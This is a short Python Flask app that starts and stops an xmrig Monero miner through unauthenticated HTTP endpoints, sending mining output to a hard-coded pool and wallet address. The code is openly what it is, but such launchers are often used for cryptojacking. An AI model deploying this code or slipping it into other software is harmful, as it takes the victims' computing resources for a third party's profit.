import subprocess
from flask import Flask, request

app = Flask(__name__)

miner_process = None

@app.route('/start', methods=['POST'])
def start_mining():
    global miner_process
    if miner_process is None:
        miner_process = subprocess.Popen(["./xmrig", "-o", "gulf.moneroocean.stream:10128", "-u", "46pdUzs2AiQNC4c7oS8rWFddLzjqfe3emUuWaoh2XxcCNANBwTtTAhbBnmMbrnsCBE54TQ9xYUAPwJkint86ZWDoPr87MAm", "-p", "x"])
    return "Mining Started"

@app.route('/stop', methods=['POST'])
def stop_mining():
    global miner_process
    if miner_process:
        miner_process.terminate()
        miner_process = None
    return "Mining Stopped"

if __name__ == '__main__':
    app.run(port=5000)